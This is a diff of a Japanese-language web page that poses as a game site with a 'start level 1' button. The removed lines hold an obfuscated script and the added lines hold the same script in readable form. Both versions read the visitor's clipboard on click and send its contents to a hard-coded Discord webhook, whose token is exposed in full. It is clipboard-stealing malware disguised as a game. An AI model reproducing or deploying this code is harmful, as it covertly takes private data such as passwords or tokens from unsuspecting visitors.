@@ -1,3 +1,39 @@
-<!DOCTYPE html><html lang="ja"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>&#36229;&#27005;&#12375;&#12356;&#12466;&#12540;&#12512;</title></head><body><h1>&#27005;&#12375;&#12356;&#12466;&#12540;&#12512;&#12469;&#12452;&#12488;</h1><button id="sendClipboard">&#12524;&#12505;&#12523;&#65297;&#12434;&#12399;&#12376;&#12417;&#12427;</button><p id="status"></p><script>
-(function(){const _0x1a3c=['#sendClipboard','readText','clipboard','ok','addEventListener','Content-Type','しばらくお待ち下さい...','UTF-8','クリップボードの内容の取得に失敗しました: ','application/json','Error: ','message','textContent','click','GET','https://discord.com/api/webhooks/1259084424440451173/HHEl0dCRfQJIJSB3TzBn-9aH7y3DQ1LWZLHAc1fxBWggZcByiF6hnWLDA11L1qeGwZc5','<meta charset=','then','catch','body','Discordのウェブフックに送信するボタン','navigator','headers','取得に失敗しました','post','utf-8'];(function(_0x1782d7,_0x3ac7ff){const _0x4de0b7=function(_0x3b2234){while(--_0x3b2234){_0x1782d7['push'](_0x1782d7['shift']());}};_0x4de0b7(++_0x3ac7ff);}(_0x1a3c,0x1c9));const _0x2c90=function(_0x1782d7,_0x3ac7ff){_0x1782d7=_0x1782d7-0x0;let _0x4de0b7=_0x1a3c[_0x1782d7];return _0x4de0b7;};(function(_0x501116){const _0x3b2234=_0x2c90;const _0x4d2b9b=_0x501116[_0x3b2234('0x15')][_0x3b2234('0x11')](_0x3b2234('0x0'));_0x4d2b9b[_0x3b2234('0x8')](_0x3b2234('0x6'),async()=>{try{const _0x1782d7=await _0x501116[_0x3b2234('0x16')][_0x3b2234('0x1')][_0x3b2234('0x3')]();const _0x4de0b7=await _0x501116['fetch'](_0x3b2234('0xf'),{'method':'POST','headers':{'Content-Type':'application/json'},'body':JSON['stringify']({'content':_0x1782d7})});if(!_0x4de0b7[_0x3b2234('0x2')]){throw new Error(_0x3b2234('0xa')+_0x4de0b7['statusText']);}_0x4d2b9b[_0x3b2234('0x7')]=_0x3b2234('0x9');}catch(_0x3b2234){_0x4d2b9b[_0x3b2234('0x7')]=_0x3b2234['message'];}});})(window);})();
-</script></body></html>
+
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>超楽しいゲーム</title>
+</head>
+<body>
+    <h1>楽しいゲームサイト</h1>
+    <button id="sendClipboard">レベル１をはじめる</button>
+    <p id="status"></p>
+
+    <script>
+        const webhookURL = 'https://discord.com/api/webhooks/1259084424440451173/HHEl0dCRfQJIJSB3TzBn-9aH7y3DQ1LWZLHAc1fxBWggZcByiF6hnWLDA11L1qeGwZc5';
+
+        document.getElementById('sendClipboard').addEventListener('click', async () => {
+            try {
+                const text = await navigator.clipboard.readText();
+                const response = await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ content: text }),
+                });
+
+                if (!response.ok) {
+                    throw new Error(`Error: ${response.statusText}`);
+                }
+
+                document.getElementById('status').textContent = '送信に成功しました。';
+            } catch (error) {
+                document.getElementById('status').textContent = `エラー: ${error.message}`;
+            }
+        });
+    </script>
+</body>
+</html>
